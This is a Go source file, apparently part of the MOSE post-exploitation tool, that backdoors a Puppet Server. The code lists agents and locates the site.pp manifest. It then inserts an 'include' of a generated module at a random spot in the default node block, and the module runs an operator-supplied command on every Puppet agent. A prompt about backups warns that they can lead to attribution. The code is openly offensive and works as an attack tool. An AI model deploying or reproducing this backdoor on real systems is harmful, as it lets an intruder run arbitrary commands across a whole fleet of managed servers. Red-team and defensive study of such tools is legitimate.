package main

// Copyright 2019 Jayson Grace. All rights reserved
// Use of this source code is governed by a MIT-style
// license that can be found in the LICENSE file.

import (
	//"fmt"
	"log"
	"os"

	"github.com/fatih/color"
	"github.com/l50/mose/pkg/utils"
	//	"path"
	"math/rand"
	"path/filepath"
	"regexp"
	"strings"
	"text/template"
	"time"

	"github.com/gobuffalo/packr/v2"
)

type Command struct {
	ClassName string
	CmdName   string
	Cmd       string
}

type myRegexp struct {
	*regexp.Regexp
}

var (
	a          = CreateAgent()
	bdCmd      = a.BdCmd
	errmsg     = color.Red
	msg        = color.Green
	osTarget   = a.OsTarget
	moduleName = a.ModuleName
)

func cleanAgentOutput(cmdOut string) []string {
	re := regexp.MustCompile("(\\w+\\.\\w+\\.\\w+)")
	newout := utils.SliceUniqMap(re.FindAllString(cmdOut, -1))
	return newout
}

func getAgents() []string {
	cmds := []string{"puppetserver ca list --all", "puppet cert list -a"}
	cmdOut := ""

	// Find the right command to run
	for _, cmd := range cmds {
		cmdOut = utils.RunCommand(cmd)
		if cmdOut != "" {
			log.Printf("Running %v", cmd)
			break
		}
		log.Printf("%v not working on this system", cmd)
	}

	agents := cleanAgentOutput(cmdOut)
	if cmdOut == "" {
		log.Fatalln("This system is not a Puppet Server, exiting.")
	} else if len(agents) == 1 && strings.Contains(agents[0], utils.GetHostname()) {
		log.Fatalln("The Puppet Server is the only agent, and you've pwned it. Exiting.")
	} else if strings.Contains(cmdOut, "No certificates to list") {
		log.Fatalln("There are no agents configured with this Puppet Server, exiting.")
	}

	return agents
}

func getModules() []string {
	var output []string
	var re = myRegexp{regexp.MustCompile(`──\s(.*?)\s`)}
	cmdOut := utils.RunCommand("puppet module list")
	if cmdOut == "" {
		log.Println("No modules are installed, creating backdoor.")
		// Create backdoored module
	}

	matches := re.FindAllStringSubmatch(cmdOut, -1)

	for _, item := range matches {
		output = append(output, item[1])
	}

	return output
}

func getExistingManifest() string {
	manifestLoc := ""
	fileList := utils.GetFileList([]string{"/etc"})
	for _, file := range fileList {
		if strings.Contains(file, "site.pp") && !strings.Contains(file, "~") && !strings.Contains(file, ".bak") &&
			!strings.Contains(file, "#") {
			manifestLoc = file
		}
	}
	if manifestLoc == "" {
		log.Fatalln("Unable to locate a manifest file to backdoor, exiting.")
	}
	return manifestLoc
}

// Create a backup of the existing manifest
func backupManifest(manifestLoc string) {
	if !utils.FileExists(manifestLoc + ".bak.mose") {
		utils.CpFile(manifestLoc, manifestLoc+".bak.mose")
		return
	} else {
		log.Printf("Backup of the manifest (%v.bak.mose) already exists.", manifestLoc)
		return
	}
}

// Get lines where the default statement starts and begins
func findDefaultStatementRange(manifestLoc string) (int, int) {
	start := 0
	finish := 0
	startFound := false
	lines, err := utils.File2lines(manifestLoc)
	if err != nil {
		log.Fatalln(err)
	}
	for i, line := range lines {
		if strings.Contains(line, "default") {
			start = i + 1
			startFound = true
			//log.Printf("Start: %v:%v", start, line)
		}
		if startFound {
			if strings.Contains(line, "}") {
				finish = i + 1
				//log.Printf("Finish: %v:%v", finish, line)
				break
			}
		}
	}
	return start, finish
}

func randInt(min int, max int) int {
	return min + rand.Intn(max-min)
}

func backdoorManifest(manifestLoc string) {
	// TODO: Offer ability to review nodes here and choose which ones to target
	start, finish := findDefaultStatementRange(manifestLoc)
	// TODO: Put the backdoor below default {} or below a node if one specific asset or a group of assets have been specified
	// Insert backdoored module into random location between the start and finish of the default statement
	rand.Seed(time.Now().UTC().UnixNano())
	err := utils.InsertStringToFile(manifestLoc, "    include "+moduleName+"\n", randInt(start, finish))
	if err != nil {
		log.Println(err)
		log.Fatalf("Failed to backdoor the manifest located at %s, exiting.", manifestLoc)
	} else {
		msg("Successfully backdoored %s", manifestLoc)
	}
}

func getPuppetCodeLoc(manifestLoc string) string {
	d, _ := filepath.Split(manifestLoc)
	return filepath.Clean(filepath.Join(d, "../"))
}

func generateModule(moduleManifest string, cmd string) bool {
	// TODO: Allow user to specify custom puppet module instead of command
	puppetCommand := Command{
		ClassName: moduleName,
		CmdName:   "cmd",
		Cmd:       bdCmd,
	}

	box := packr.New("Puppet", "../../../templates")

	s, err := box.FindString("puppetModule.tmpl")

	if err != nil {
		log.Fatal("Parse: ", err)
	}

	t, err := template.New("puppetModule").Parse(s)

	if err != nil {
		log.Fatal("Parse: ", err)
	}

	f, err := os.Create(moduleManifest)

	if err != nil {
		log.Fatalln(err)
	}

	err = t.Execute(f, puppetCommand)

	if err != nil {
		log.Fatal("Execute: ", err)
	}

	f.Close()

	return true
}

func createModule(manifestLoc string, moduleName string, cmd string) {
	puppetCodeLoc := getPuppetCodeLoc(manifestLoc)
	moduleLoc := filepath.Join(puppetCodeLoc, "modules", moduleName)
	// If you have to create a folder for files as well:
	//folders := []string{filepath.Join(moduleLoc, "manifests"), filepath.Join(moduleLoc, "files")}
	moduleFolders := []string{filepath.Join(moduleLoc, "manifests")}
	moduleManifest := filepath.Join(moduleLoc, "manifests", "init.pp")
	if utils.CreateFolders(moduleFolders) == true && generateModule(moduleManifest, cmd) == true {
		msg("Successfully created the %s module at %s", moduleName, moduleManifest)
	} else {
		log.Fatalf("Failed to create %s module", moduleName)
	}
}

func main() {
	// TODO: Add ability to specify all puppet agents or a specific one

	// If we're not root, we probably can't backdoor any of the puppet code, so exit
	// This may not always be true as per https://puppet.com/blog/puppet-without-root-a-real-life-example
	// But we'll start with this
	utils.CheckRoot()
	agents := getAgents()

	log.Printf("Puppet Agents found: %q", agents)

	modules := getModules()
	log.Printf("Modules found: %q", modules)

	msg("Backdooring Puppet Server to run %s on all Puppet agents, please wait...", bdCmd)

	manifestLoc := getExistingManifest()
	if utils.AskUserQuestion("Do you want to create a backup of the manifest? This can lead to attribution, but can save your bacon if you screw something up.", osTarget) {
		backupManifest(manifestLoc)
	}

	backdoorManifest(manifestLoc)

	// TODO: Do we want to add a backdoorModule capability?
	createModule(manifestLoc, moduleName, bdCmd)
}
